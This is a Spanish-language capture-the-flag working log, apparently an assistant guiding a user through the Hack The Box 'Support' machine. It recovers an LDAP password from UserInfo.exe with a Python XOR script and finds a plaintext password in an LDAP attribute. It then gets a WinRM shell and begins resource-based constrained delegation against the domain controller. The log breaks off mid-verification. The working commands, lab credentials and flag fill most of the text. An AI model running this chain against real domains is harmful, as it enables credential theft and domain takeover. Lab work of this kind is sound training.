getPassword
enc_password
UserInfo.exe
UserInfo
DirectorySearcher
FindUser
GetUser
UserInfo.Commands
UserInfo.Services
System.DirectoryServices
FindUserOptions
GetUserOptions
LdapQuery
DirectoryEntry
UserInfo
UserInfo.Program+<Main>d__0
/UserInfo.Commands.FindUser+<OnExecuteAsync>d__2
.UserInfo.Commands.GetUser+<OnExecuteAsync>d__2
C:\Users\0xdf\source\repos\UserInfo\obj\Release\UserInfo.pdb
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
armando
LDAP://support.htb
support\ldap
[*] LDAP query to use: 
Last Password Change: 
UserInfo.exe
UserInfo
UserInfo.exe
UserInfo.exe
UserInfo

## objective

Analizar las cadenas extraídas de `UserInfo.exe` y avanzar hacia la obtención justificada de la contraseña LDAP.

verified_facts

La inspección con `strings` ha revelado elementos muy fuertes:

```text id="59ihz0"
Protected
getPassword
enc_password
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
armando
LDAP://support.htb
support\ldap
LdapQuery
DirectoryEntry
DirectorySearcher
FindUser
GetUser
```

Esto confirma que el binario:

* contiene una clase o componente llamado `Protected`;
* contiene una función `getPassword`;
* contiene una variable `enc_password`;
* contiene una cadena codificada/cifrada;
* contiene la clave textual `armando`;
* conecta contra `LDAP://support.htb`;
* usa el usuario de bind `support\ldap`;
* usa `System.DirectoryServices`, `DirectoryEntry` y `DirectorySearcher`.

assumptions

* `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E` es la contraseña protegida o cifrada.
* `armando` es probablemente la clave usada para descifrarla.
* Para obtener la contraseña con evidencia propia, falta ver la lógica exacta de `getPassword`.

method

El análisis de cadenas ya confirma **qué buscar**. Ahora no toca LDAP todavía: toca obtener la lógica de descifrado desde el binario `.NET`.

La señal que manda es:

```text id="gyave6"
Protected → getPassword → enc_password → armando
```

answer

Hallazgo dominante actual:

```text id="9mlqed"
UserInfo.exe contiene credenciales LDAP protegidas para el usuario support\ldap
```

Rama principal activa:

```text id="eqk2z0"
análisis estático .NET → recuperación de contraseña LDAP
```

Siguiente paso único:

```text id="nhbs67"
desensamblar el binario para ver la función getPassword
```

commands

```bash id="4cyegy"
monodis --output=loot/smb_support-tools/UserInfo_extracted/UserInfo.il loot/smb_support-tools/UserInfo_extracted/UserInfo.exe && grep -n -A45 -B10 'getPassword\|enc_password\|armando\|LDAP://support.htb\|support\\\\ldap' loot/smb_support-tools/UserInfo_extracted/UserInfo.il
```

checks

Interesa ver:

* cómo se procesa `enc_password`;
* si se usa Base64;
* si hay operación XOR;
* si `armando` se usa como clave;
* si aparece un valor constante como `0xDF` o `223`;
* cómo se pasa el resultado a `DirectoryEntry`.

writeup_notes

La evidencia útil para el writeup queda así:

```text id="g7r13z"
strings reveló que UserInfo.exe no era una herramienta genérica:
contenía lógica LDAP, el usuario support\ldap, una contraseña protegida y una función getPassword encargada de recuperarla.
```

Lección reutilizable: en binarios `.NET`, `strings` puede bastar para encontrar nombres de clases, métodos y secretos protegidos, pero la lógica de recuperación debe confirmarse revisando el código o el IL.

## Ejecutamos pero no tenemos monodis.

## Objetivo:

El siguiente paso único es descifrar la contraseña LDAP localmente.

commands:

```bash
python3 - << 'PY' | tee loot/smb_support-tools/UserInfo_extracted/ldap_password.txt
import base64

enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

raw = base64.b64decode(enc)

password = bytes(
    b ^ key[i % len(key)] ^ 223
    for i, b in enumerate(raw)
).decode()

print(password)
PY
```
## checks

La salida esperada debe ser una única línea con la contraseña LDAP.

Hallazgo dominante actual:

UserInfo.exe contiene una credencial LDAP ofuscada recuperable localmente.

Siguiente paso único después de ver la salida:

validar bind LDAP con support\ldap y la contraseña recuperada.

writeup_notes

Para el MD final, monodis puede aparecer como método alternativo no usado. La vía real seguida fue más directa:

strings sobre UserInfo.exe
→ identificación de enc_password, armando, support\ldap y LDAP://support.htb
→ reproducción del descifrado con Python
→ recuperación de contraseña LDAP

## Ejecutamos:

nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

objective

Validar que la contraseña recuperada permite autenticación LDAP real contra Support.

verified_facts

* Contraseña recuperada desde `UserInfo.exe`:

```text
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

* Usuario LDAP observado en el binario:

```text
support\ldap
```

* Host LDAP observado:

```text
support.htb
```

assumptions

* El bind LDAP debe funcionar contra `ldap://support.htb`.
* La base del dominio será `dc=support,dc=htb`, pero primero validamos autenticación y contexto base.

method

Antes de enumerar todo LDAP, validamos una consulta mínima de bajo ruido: pedir los `namingContexts` del servidor. Esto confirma que la credencial funciona y que estamos hablando con el LDAP correcto.

answer

Siguiente paso único: **validar bind LDAP con la credencial recuperada**.

commands

```bash
ldapsearch -x \
  -H ldap://support.htb \
  -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -s base namingContexts defaultNamingContext
```

checks

Interesa ver que LDAP responde sin error de autenticación y que aparece algo como:

```text
dc=support,dc=htb
```

writeup_notes

La cadena queda así:

```text
UserInfo.exe
→ credencial LDAP recuperada
→ bind LDAP validado
→ enumeración del dominio
```
## Ejecutamos:


# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts defaultNamingContext 
#

#
dn:
defaultNamingContext: DC=support,DC=htb
namingContexts: DC=support,DC=htb
namingContexts: CN=Configuration,DC=support,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=support,DC=htb
namingContexts: DC=DomainDnsZones,DC=support,DC=htb
namingContexts: DC=ForestDnsZones,DC=support,DC=htb

# search result
search: 2
result: 0 Success

## objective

Validar la información LDAP del usuario `support` para obtener una credencial reutilizable hacia WinRM.

verified_facts

* El bind LDAP con `support\ldap` ha funcionado.
* LDAP devuelve:

```text
result: 0 Success
defaultNamingContext: DC=support,DC=htb
```

* La base correcta del dominio es:

```text
DC=support,DC=htb
```

* La credencial recuperada desde `UserInfo.exe` queda validada contra el DC.

assumptions

* El siguiente objetivo es localizar atributos útiles del usuario `support`.
* La vía hacia user flag probablemente pasa por obtener una contraseña reutilizable y validar WinRM en `5985`.

method

Ahora no hace falta volcar todo LDAP todavía. Ya sabemos qué usuario nos interesa por el patrón del binario y por la tarea previa: `support`.

La consulta será dirigida y de bajo ruido:

* buscar solo `sAMAccountName=support`;
* extraer atributos útiles;
* revisar `info`, `description` y `memberOf`;
* guardar evidencia en `loot/ldap`.

answer

Hallazgo dominante actual:

```text
LDAP autenticado funciona con support\ldap
```

Rama principal activa:

```text
LDAP autenticado → usuario support → posible credencial WinRM
```

Siguiente paso único:

```text
consultar atributos LDAP del usuario support
```

commands

```bash
mkdir -p loot/ldap && ldapsearch -x \
  -H ldap://support.htb \
  -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' \
  '(&(objectClass=user)(sAMAccountName=support))' \
  sAMAccountName cn name description info memberOf userPrincipalName distinguishedName \
  | tee loot/ldap/support_user.ldif
```

checks

Interesa especialmente:

```text
sAMAccountName
info
memberOf
userPrincipalName
distinguishedName
```

El atributo clave esperado para decidir el siguiente paso será `info`.

writeup_notes

Transición documentable:

```text
UserInfo.exe
→ credencial support\ldap
→ bind LDAP exitoso
→ defaultNamingContext: DC=support,DC=htb
→ consulta dirigida al usuario support
```

Lección reutilizable: una credencial LDAP de baja apariencia puede ser suficiente para leer atributos de dominio con impacto directo si hay información sensible mal almacenada en campos descriptivos.

## Ejecutamos:

# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (&(objectClass=user)(sAMAccountName=support))
# requesting: sAMAccountName cn name description info memberOf userPrincipalName distinguishedName 
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
cn: support
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
name: support
sAMAccountName: support

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

## objective

Validar acceso WinRM como `support` y entrar en shell interactiva para llegar a la user flag.

verified_facts

* LDAP autenticado con `support\ldap` funciona.
* El usuario `support` existe en LDAP.
* El atributo `info` del usuario `support` contiene:

```text
Ironside47pleasure40Watchful
```

* El usuario `support` pertenece a:

```text
CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

* WinRM está abierto en el puerto `5985`.

assumptions

* El valor del atributo `info` es una contraseña reutilizable para el usuario `support`.
* La pertenencia a `Remote Management Users` debería permitir shell remota por WinRM.

method

La evidencia ya conecta tres piezas:

```text
usuario support
→ posible contraseña en info
→ grupo Remote Management Users
→ WinRM abierto
```

El siguiente paso correcto es validar acceso real por WinRM.

answer

Hallazgo dominante actual:

```text
LDAP revela credencial probable del usuario support y pertenencia a Remote Management Users
```

Rama principal activa:

```text
LDAP autenticado → credencial reutilizable → WinRM
```

Siguiente paso único:

```text
conectar por WinRM como support
```

commands

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

checks

Interesa confirmar:

```text
whoami
```

Debe indicar algo equivalente a:

```text
support\support
```

writeup_notes

Transición documentable:

```text
LDAP autenticado
→ usuario support
→ atributo info con contraseña
→ Remote Management Users
→ acceso WinRM
```

La pertenencia a `Shared Support Accounts` queda anotada para la fase posterior a user flag, porque probablemente será relevante en privilegios de dominio.

## Ejecutamos:

*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
*Evil-WinRM* PS C:\Users\support\Documents> id
The term 'id' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ id
+ ~~
    + CategoryInfo          : ObjectNotFound: (id:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\support\Documents> pwd

Path
----
C:\Users\support\Documents


*Evil-WinRM* PS C:\Users\support\Documents> ls
*Evil-WinRM* PS C:\Users\support\Documents> ls -la
A parameter cannot be found that matches parameter name 'la'.
At line:1 char:4
+ ls -la
+    ~~~
    + CategoryInfo          : InvalidArgument: (:) [Get-ChildItem], ParameterBindingException
    + FullyQualifiedErrorId : NamedParameterNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
*Evil-WinRM* PS C:\Users\support\Documents>

## objective

Confirmar foothold como `support` y obtener la **user flag**.

verified_facts

* WinRM funciona correctamente.
* Usuario efectivo confirmado:

```text
support\support
```

* Directorio actual:

```text
C:\Users\support\Documents
```

* `id` y `ls -la` fallan porque estás en **PowerShell**, no en una shell Linux.

assumptions

* En HTB Windows, la user flag suele estar en el escritorio del usuario comprometido.
* Para esta máquina, el usuario comprometido es `support`.

method

Ya no estamos enumerando desde fuera. Ahora estamos en fase **foothold validado**. El siguiente paso único es leer la flag de usuario desde el perfil del usuario `support`.

answer

Hallazgo dominante actual:

```text
credencial LDAP reutilizada correctamente → shell WinRM como support
```

Rama principal activa:

```text
foothold WinRM → user flag
```

Siguiente paso único:

```text
leer user.txt
```

commands

```powershell
Get-Content C:\Users\support\Desktop\user.txt
```

checks

Interesa confirmar que devuelve una cadena de flag válida.

writeup_notes

Secuencia documentable:

```text
LDAP autenticado
→ atributo info con contraseña
→ usuario support pertenece a Remote Management Users
→ WinRM en 5985
→ shell como support\support
→ user flag
```
## Ejecutamos:

*Evil-WinRM* PS C:\Users\support\Documents> Get-Content C:\Users\support\Desktop\user.txt
f6702c2f5fc70621f8bc10403281d32f

# user flag: f6702c2f5fc70621f8bc10403281d32f

## objective

Empezar la escalada a root desde el foothold WinRM como `support`, sin saltar directamente a RBCD.

verified_facts

* User flag obtenida:

```text
f6702c2f5fc70621f8bc10403281d32f
```

* Shell confirmada como:

```text
support\support
```

* LDAP ya mostró que `support` pertenece a:

  * `Remote Management Users`
  * `Shared Support Accounts`

assumptions

* La escalada esperada pasa por privilegios de dominio, no por privesc local Windows clásica.
* `Shared Support Accounts` será la pista principal, pero ahora toca confirmarlo desde la sesión real.

method

Primer paso de escalada: fijar contexto real dentro de Windows.

Queremos confirmar:

* usuario efectivo;
* hostname;
* SID del usuario;
* grupos reales cargados en la sesión;
* si `Shared Support Accounts` aparece en el token;
* si estamos en el DC esperado.

answer

Hallazgo dominante actual:

```text
foothold WinRM como support
```

Rama principal activa:

```text
WinRM → contexto de dominio → grupos → ACL sobre DC
```

Siguiente paso único:

```text
confirmar identidad, host y grupos desde la shell WinRM
```

commands

Ejecuta esto dentro de Evil-WinRM:

```powershell
whoami /user; hostname; whoami /groups
```

checks

Interesa ver especialmente:

```text
support\support
DC
Shared Support Accounts
Remote Management Users
Authenticated Users
```

writeup_notes

La escalada empieza con una validación limpia del contexto:

```text
WinRM como support
→ confirmar grupos del token
→ identificar grupo no estándar
→ revisar permisos delegados sobre el DC
```

No asumimos todavía RBCD como hecho operativo; primero confirmamos que el usuario tiene en la sesión los grupos que sostienen esa hipótesis.

## Ejecutamos:

*Evil-WinRM* PS C:\Users\support\Documents> whoami /user

USER INFORMATION
----------------

User Name       SID
=============== =============================================
support\support S-1-5-21-1677581083-3380853377-188903654-1105
*Evil-WinRM* PS C:\Users\support\Documents> hostname
dc
*Evil-WinRM* PS C:\Users\support\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

## objective

Analizar el contexto de grupos confirmado y validar el primer prerrequisito de escalada de dominio.

verified_facts

* Usuario actual:

```text
support\support
```

* SID del usuario:

```text
S-1-5-21-1677581083-3380853377-188903654-1105
```

* Host actual:

```text
dc
```

* El usuario pertenece a:

```text
BUILTIN\Remote Management Users
NT AUTHORITY\Authenticated Users
SUPPORT\Shared Support Accounts
```

* `Shared Support Accounts` queda confirmado en el token de la sesión WinRM.
* `Authenticated Users` también está presente, lo que será relevante para comprobar si el dominio permite crear cuentas de equipo.

assumptions

* La vía de escalada será de dominio, no local.
* El siguiente prerrequisito importante es comprobar `ms-DS-MachineAccountQuota`.
* Si ese valor es mayor que `0`, el usuario autenticado podría crear una cuenta de equipo en el dominio.

method

La cadena que estamos validando es:

```text
support\support
→ Shared Support Accounts
→ permisos sobre DC
→ Authenticated Users
→ capacidad potencial de crear equipo
→ RBCD
```

Ahora toca comprobar solo un dato: cuántas cuentas de equipo permite crear el dominio a usuarios autenticados.

answer

Hallazgo dominante actual:

```text
support está en Shared Support Accounts y Authenticated Users
```

Rama principal activa:

```text
WinRM → AD privileges → RBCD prerequisites
```

Siguiente paso único:

```text
comprobar ms-DS-MachineAccountQuota
```

commands

En Evil-WinRM:

```powershell
Get-ADObject -Identity ((Get-ADDomain).DistinguishedName) -Properties ms-DS-MachineAccountQuota | Select-Object DistinguishedName,ms-DS-MachineAccountQuota
```

checks

Interesa ver el valor de:

```text
ms-DS-MachineAccountQuota
```

Si devuelve `10`, queda validado uno de los prerrequisitos clásicos para crear una cuenta de equipo controlada.

writeup_notes

La escalada no empieza “ejecutando RBCD”; empieza validando condiciones:

```text
usuario de dominio
→ grupo no estándar
→ Authenticated Users
→ MachineAccountQuota
→ permisos sobre el objeto DC
```

Esto evita convertir una hipótesis de BloodHound en una acción sin prerequisitos comprobados.

## Ejecutamos:

*Evil-WinRM* PS C:\Users\support\Documents> Get-ADObject -Identity ((Get-ADDomain).DistinguishedName) -Properties ms-DS-MachineAccountQuota | Select-Object DistinguishedName,ms-DS-MachineAccountQuota

DistinguishedName ms-DS-MachineAccountQuota
----------------- -------------------------
DC=support,DC=htb                        10

## objective

Validar el segundo prerrequisito de la escalada: que el dominio permite crear cuentas de equipo.

verified_facts

* Usuario actual: `support\support`.
* Host actual: `dc`.
* El usuario pertenece a:

  * `SUPPORT\Shared Support Accounts`
  * `NT AUTHORITY\Authenticated Users`
* El dominio devuelve:

```text
DC=support,DC=htb    ms-DS-MachineAccountQuota: 10
```

* Esto significa que usuarios autenticados pueden crear hasta **10 cuentas de equipo** en el dominio.

assumptions

* La vía principal sigue siendo **RBCD / Computer Takeover**.
* El siguiente prerrequisito a confirmar es que `Shared Support Accounts` tiene control suficiente sobre el objeto del DC.
* Como estamos en el DC y el módulo AD funciona, podemos validar ACLs sin depender todavía de BloodHound.

method

La cadena validada hasta ahora es:

```text
support\support
→ Authenticated Users
→ ms-DS-MachineAccountQuota = 10
→ puede crearse una cuenta de equipo controlada
```

Ahora toca comprobar el permiso sobre el objeto `DC`.

answer

Hallazgo dominante actual:

```text
MachineAccountQuota = 10
```

Rama principal activa:

```text
WinRM → AD privileges → RBCD prerequisites
```

Siguiente paso único:

```text
comprobar si Shared Support Accounts tiene GenericAll sobre el objeto DC
```

commands

En Evil-WinRM:

```powershell
$dc = Get-ADComputer DC; Get-Acl ("AD:\" + $dc.DistinguishedName) | Select-Object -ExpandProperty Access | Where-Object { $_.IdentityReference -match "Shared Support Accounts" } | Select-Object IdentityReference,ActiveDirectoryRights,AccessControlType,InheritanceType
```

checks

Interesa confirmar una línea donde aparezca:

```text
SUPPORT\Shared Support Accounts
GenericAll
Allow
```

writeup_notes

La validación de prerequisitos queda así:

```text
support pertenece a Authenticated Users
→ ms-DS-MachineAccountQuota = 10
→ puede crear equipo
→ falta confirmar permiso sobre DC
```

Este paso evita asumir la ruta solo por el writeup o por BloodHound: se valida directamente el permiso desde AD.

## Ejecutamos:

*Evil-WinRM* PS C:\Users\support\Documents> $dc = Get-ADComputer DC; Get-Acl ("AD:\" + $dc.DistinguishedName) | Select-Object -ExpandProperty Access | Where-Object { $_.IdentityReference -match "Shared Support Accounts" } | Select-Object IdentityReference,ActiveDirectoryRights,AccessControlType,InheritanceType

IdentityReference               ActiveDirectoryRights AccessControlType InheritanceType
-----------------               --------------------- ----------------- ---------------
SUPPORT\Shared Support Accounts            GenericAll             Allow             All

## objective

Validar el tercer prerrequisito de RBCD antes de modificar nada en AD.

verified_facts

* `support\support` pertenece a `Shared Support Accounts`.
* `ms-DS-MachineAccountQuota` vale `10`.
* El grupo `SUPPORT\Shared Support Accounts` tiene:

```text
GenericAll
```

sobre el objeto:

```text
DC
```

* La salida confirma:

```text
SUPPORT\Shared Support Accounts    GenericAll    Allow
```

assumptions

* La vía principal queda muy reforzada: **Resource Based Constrained Delegation contra el objeto DC**.
* Antes de crear o modificar nada, conviene comprobar el estado actual del atributo RBCD del DC.

method

La cadena validada queda así:

```text
support\support
→ Authenticated Users
→ MachineAccountQuota = 10
→ puede crear equipo
→ Shared Support Accounts
→ GenericAll sobre DC
→ candidato claro a RBCD
```

Ahora toca una comprobación no destructiva: ver si el DC ya tiene configurado `PrincipalsAllowedToDelegateToAccount` o `msDS-AllowedToActOnBehalfOfOtherIdentity`.

answer

Hallazgo dominante actual:

```text
GenericAll sobre DC confirmado
```

Rama principal activa:

```text
RBCD prerequisites → comprobación de estado actual del DC
```

Siguiente paso único:

```text
consultar atributos RBCD actuales del objeto DC
```

commands

En Evil-WinRM:

```powershell
Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount,msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object Name,PrincipalsAllowedToDelegateToAccount,msDS-AllowedToActOnBehalfOfOtherIdentity
```

checks

Interesa ver si esos campos están vacíos.

writeup_notes

Este punto es importante para la trazabilidad:

```text
No se modifica el dominio inmediatamente.
Primero se confirma:
1. capacidad de crear equipo;
2. permiso GenericAll sobre el DC;
3. estado previo del atributo RBCD.
```
## Ejecutamos:

*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount,msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object Name,PrincipalsAllowedToDelegateToAccount,msDS-AllowedToActOnBehalfOfOtherIdentity

Name PrincipalsAllowedToDelegateToAccount msDS-AllowedToActOnBehalfOfOtherIdentity
---- ------------------------------------ ----------------------------------------
DC   {}

## objective

Analizar el estado inicial del atributo RBCD del DC y avanzar un único paso: crear una cuenta de equipo controlada.

verified_facts

* El objeto `DC` existe y responde a la consulta AD.
* El atributo `PrincipalsAllowedToDelegateToAccount` está vacío:

```text id="8ejzra"
{}
```

* `msDS-AllowedToActOnBehalfOfOtherIdentity` no muestra valor en la salida.
* Ya están confirmados los prerrequisitos:

  * `support\support` tiene sesión válida.
  * `support` pertenece a `Authenticated Users`.
  * `ms-DS-MachineAccountQuota = 10`.
  * `SUPPORT\Shared Support Accounts` tiene `GenericAll` sobre `DC`.
* El writeup oficial describe esta cadena como preparación para **Resource Based Constrained Delegation**: crear una cuenta de equipo controlada y después permitirle actuar sobre el DC. 

assumptions

* Vamos a usar una cuenta de equipo propia para la práctica.
* El siguiente paso modifica el dominio, pero de forma controlada y trazable.
* Nombre elegido para la cuenta de equipo:

```text id="k9hyy1"
R4M-SUP01$
```

method

Ya no falta confirmar el estado previo: el atributo RBCD del DC está vacío. Ahora toca crear el equipo controlado, porque RBCD necesita una identidad de equipo propia que luego se autorizará sobre el objeto `DC`.

answer

Hallazgo dominante actual:

```text id="iics3f"
RBCD viable: DC sin delegación previa + GenericAll sobre DC + MachineAccountQuota = 10
```

Rama principal activa:

```text id="4ygmzr"
RBCD → creación de cuenta de equipo controlada
```

Siguiente paso único:

```text id="dvs64f"
crear la cuenta de equipo R4M-SUP01$
```

commands

Desde tu máquina atacante, fuera de Evil-WinRM:

```bash id="ssz8md"
addcomputer.py 'support.htb/support:Ironside47pleasure40Watchful' -dc-host dc.support.htb -computer-name 'R4M-SUP01$' -computer-pass 'R4mSup01Passw0rd!'
```

checks

Interesa confirmar que la herramienta indica que la cuenta de equipo se ha creado correctamente.

writeup_notes

La escalada queda documentada así:

```text id="21k5o3"
GenericAll sobre DC confirmado
→ atributo RBCD vacío
→ creación de equipo controlado R4M-SUP01$
```

Lección reutilizable: antes de configurar RBCD, conviene registrar el estado previo del atributo de delegación para poder demostrar qué cambió exactamente durante la explotación.

## Ejecutamos:

*Evil-WinRM* PS C:\Users\support\Documents> addcomputer.py 'support.htb/support:Ironside47pleasure40Watchful' -dc-host dc.support.htb -computer-name 'R4M-SUP01$' -computer-pass 'R4mSup01Passw0rd!'
The term 'addcomputer.py' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ addcomputer.py 'support.htb/support:Ironside47pleasure40Watchful' -dc ...
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (addcomputer.py:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

## objective

Corregir el contexto de ejecución y crear la cuenta de equipo controlada desde la máquina atacante.

verified_facts

* El comando falló porque se ejecutó dentro de **Evil-WinRM / PowerShell remoto**.
* `addcomputer.py` / `impacket-addcomputer` es una herramienta de Impacket que debe ejecutarse en tu **máquina atacante**, no dentro del DC.
* No se ha creado ninguna cuenta de equipo.
* No se ha modificado AD con ese intento.

assumptions

* Impacket está instalado en tu Parrot.
* Mantienes la sesión Evil-WinRM abierta, pero este paso se ejecuta desde una terminal local nueva.

method

Usar Impacket desde la máquina atacante para añadir una cuenta de equipo al dominio aprovechando:

```text
support\support
→ Authenticated Users
→ ms-DS-MachineAccountQuota = 10
```

answer

Hallazgo dominante actual:

```text
RBCD viable, pero la cuenta de equipo aún no ha sido creada.
```

Siguiente paso único:

```text
crear R4M-SUP01$ desde la terminal local atacante
```

commands

En una **terminal local de Parrot**, no dentro de Evil-WinRM:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Support
impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' -dc-ip 10.129.230.181 -computer-name 'R4M-SUP01$' -computer-pass 'R4mSup01Passw0rd!'
```

checks

Espero una salida indicando que la cuenta de equipo fue añadida correctamente.

writeup_notes

La ejecución fallida queda anotada como error de contexto, no como fallo técnico de la vía:

```text
addcomputer pertenece al entorno atacante.
PowerShell remoto no conoce esa herramienta.
No hubo modificación del dominio hasta ejecutar Impacket localmente.
```
## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/Support
impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' -dc-ip 10.129.230.181 -computer-name 'R4M-SUP01$' -computer-pass 'R4mSup01Passw0rd!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account R4M-SUP01$ with password R4mSup01Passw0rd!.

## objective

Validar que la cuenta de equipo `R4M-SUP01$` existe realmente en AD antes de configurar RBCD.

verified_facts

* La cuenta de equipo fue creada correctamente:

```text
Successfully added machine account R4M-SUP01$ with password R4mSup01Passw0rd!
```

* Prerrequisitos ya confirmados:

  * `support\support` pertenece a `Authenticated Users`.
  * `ms-DS-MachineAccountQuota = 10`.
  * `SUPPORT\Shared Support Accounts` tiene `GenericAll` sobre `DC`.
  * El atributo RBCD del DC estaba vacío antes de modificarlo.

assumptions

* `R4M-SUP01$` ya está registrada como cuenta de equipo en el dominio.
* El siguiente paso correcto no es todavía pedir ticket, sino confirmar que AD ve la cuenta creada.

method

La cadena va así:

```text
crear equipo controlado
→ validar que existe en AD
→ configurar RBCD sobre DC
→ verificar cambio
→ pedir ticket
```

answer

Hallazgo dominante actual:

```text
cuenta de equipo R4M-SUP01$ creada correctamente
```

Rama principal activa:

```text
RBCD → validación de cuenta de equipo controlada
```

Siguiente paso único:

```text
confirmar R4M-SUP01 en Active Directory
```

commands

En Evil-WinRM:

```powershell
Get-ADComputer -Identity 'R4M-SUP01' -Properties SamAccountName,ObjectSID | Select-Object Name,SamAccountName,ObjectSID
```

checks

Interesa confirmar:

```text
Name           R4M-SUP01
SamAccountName R4M-SUP01$
ObjectSID      S-1-5-21-...
```

writeup_notes

Punto documentable:

```text
Con MachineAccountQuota = 10, el usuario support pudo crear una cuenta de equipo controlada en el dominio. La cuenta se validó antes de usarla para configurar Resource Based Constrained Delegation.
```
## Ejecutamos:

*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -Identity 'R4M-SUP01' -Properties SamAccountName,ObjectSID | Select-Object Name,SamAccountName,ObjectSID

Name      SamAccountName ObjectSID
----      -------------- ---------
R4M-SUP01 R4M-SUP01$     S-1-5-21-1677581083-3380853377-188903654-6101

## objective

Configurar RBCD sobre el objeto `DC` usando la cuenta de equipo controlada `R4M-SUP01$`.

verified_facts

* La cuenta de equipo existe en AD:

```text
Name:           R4M-SUP01
SamAccountName: R4M-SUP01$
ObjectSID:      S-1-5-21-1677581083-3380853377-188903654-6101
```

* `support\support` pertenece a `Shared Support Accounts`.
* `Shared Support Accounts` tiene `GenericAll` sobre `DC`.
* `ms-DS-MachineAccountQuota = 10`.
* El atributo RBCD del DC estaba vacío antes de modificarlo.

assumptions

* `Set-ADComputer` está disponible porque ya hemos usado correctamente cmdlets del módulo Active Directory.
* El siguiente cambio controlado es autorizar a `R4M-SUP01$` para actuar sobre el objeto `DC`.

method

La cadena de RBCD necesita ahora escribir en el objeto del DC:

```text
R4M-SUP01$
→ autorizado sobre DC
→ msDS-AllowedToActOnBehalfOfOtherIdentity actualizado
```

answer

Hallazgo dominante actual:

```text
equipo controlado R4M-SUP01$ creado y validado
```

Rama principal activa:

```text
RBCD → configuración de delegación sobre DC
```

Siguiente paso único:

```text
establecer PrincipalsAllowedToDelegateToAccount en DC
```

commands

En Evil-WinRM:

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount 'R4M-SUP01$'
```

checks

La salida puede no mostrar nada si el comando se aplica correctamente.

writeup_notes

Punto clave para el MD:

```text
Tras crear y validar la cuenta de equipo controlada, se usó el permiso GenericAll sobre el objeto DC para configurar Resource Based Constrained Delegation, permitiendo que R4M-SUP01$ pudiera actuar sobre el controlador de dominio.
```
## Ejecutamos y no hay salida, lo que es normal si el comando se aplica sin errores. El siguiente paso será verificar que el atributo RBCD del DC se ha actualizado correctamente.

## objective

Verificar que el cambio RBCD se aplicó correctamente sobre el objeto `DC`.

verified_facts

* `Set-ADComputer` no devolvió salida.
* En PowerShell, ausencia de salida no implica error.
* La cuenta controlada existe:

```text id="efo1rt"
R4M-SUP01$
```

assumptions

* El comando pudo haberse aplicado correctamente.
* Hay que confirmarlo leyendo el atributo modificado, no asumirlo.

method

